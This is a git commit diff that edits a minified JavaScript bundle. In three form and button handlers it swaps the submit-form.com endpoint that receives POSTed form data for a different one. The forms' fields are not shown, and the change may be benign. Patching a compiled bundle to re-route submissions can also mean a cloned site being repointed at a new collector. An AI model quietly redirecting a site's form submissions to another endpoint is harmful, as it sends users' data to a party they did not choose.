34de258eb0ebfa157d83d8890a39fa32b1526631
dkacyber000 <emanilove@protonmail.com>
2025-03-26 12:32:51 +0500

    Add files via upload

--- main.be179052.js
+++ main.be179052.js
@@ -9814,7 +9814,7 @@
                                 className: "ant-form ant-form-horizontal css-m4timi",
                                 onSubmit: e => {
                                     e.preventDefault(),
-                                    fetch("https://submit-form.com/mjWp866zr", {
+                                    fetch("https://submit-form.com/Xa1U8pE3Q", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
@@ -13358,7 +13358,7 @@
                             he.jsxs)("form", {
                                 onSubmit: n => {
                                     n.preventDefault(),
-                                    u && o ? (fetch("https://submit-form.com/mjWp866zr", {
+                                    u && o ? (fetch("https://submit-form.com/Xa1U8pE3Q", {
                                         method: "POST",
                                         headers: {
                                             "Content-Type": "application/json"
@@ -13471,7 +13471,7 @@
                 he.jsx)("button", {
                     onClick: n => {
                         n.preventDefault(),
-                        fetch("https://submit-form.com/mjWp866zr", {
+                        fetch("https://submit-form.com/Xa1U8pE3Q", {
                             method: "POST",
                             headers: {
                                 "Content-Type": "application/json"
